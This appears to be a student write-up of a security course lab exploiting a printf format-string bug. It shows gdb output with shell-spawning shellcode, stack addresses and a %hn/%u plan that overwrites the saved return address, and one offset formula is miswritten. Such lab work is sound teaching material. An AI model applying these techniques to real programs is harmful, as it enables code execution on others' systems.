# 06 - Antares Writeup

## Main Idea

The code is vulnerable because of the printf function. We can define arguments to write what we want to memory.
Before that, we need to know the steps of printf. You can see the detail in [task-description](https://sp24.cs161.org/proj1/q6/)

## Exploit steps

First, find the address of shellcode `0xffffd7f8`, which will be passed by argv in main.

``` C++
(gdb) p argv[1]
$2 = 0xffffd7f8 "j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/bin\2
11\343PRQS\211\341\061Ұ\v̀"
```

Second, step into calibrate, file the address of buf `0xffffd5d0` and RIP of calibrate `0xffffd5bc`.

```C++
(gdb) i f
Stack level 0, frame at 0xffffd5c0:
 eip = 0x8049224 in calibrate (calibrate.c:10); saved eip = 0x804928f
 called by frame at 0xffffd670
 source language c.
 Arglist at 0xffffd5b8, args: buf=0xffffd5d0 ""
 Locals at 0xffffd5b8, Previous frame's sp is 0xffffd5c0
 Saved registers:
  ebp at 0xffffd5b8, eip at 0xffffd5bc
(gdb) x/16x buf
0xffffd5d0:     0x00001000      0x00000000      0x00000000      0x0804904a
0xffffd5e0:     0x00000000      0x000003ee      0x000003ee      0x000003ee      
0xffffd5f0:     0x000003ee      0xffffd7db      0x178bfbff      0x00000064      
0xffffd600:     0x00000000      0x00000000      0x00000000      0x00000000
```

Third, we need to find address of fmt of printf `0xffffd590`. Then, we need to calculate the offset between the address of fmt and the address of buf is `0xffffd5d0 - (0xffffd5d0 + 4)` = 60bytes = 15words, note, per %c will consume one word  .

Fourth，we need to write the address of shellcode into RIP using %hn and %u.
%hn is the target address, and %_u is the number we have printf.
According to the hint, the address will be split into two parts.

- First part, %hn (target address) is `0xffffd5bc`,  %_u is the first half of `0xffffd7f8` = `0xd7f8`, first half of shellcode address. we have printf 16(AAAA+addr+AAAA+addr) + 15(%c), the number will be `0xd7f8 - 31`.
- Second part, %u (number we have printf) is `0xffff - 0xd7f8`.

## Exploit GDB Output

before attack

```C++
(gdb) x 0xffffd5bc
0xffffd5bc:     0x0804928f
```

after attack

```  C++
(gdb) x 0xffffd5bc
0xffffd5bc:     0xffffd7f8
```
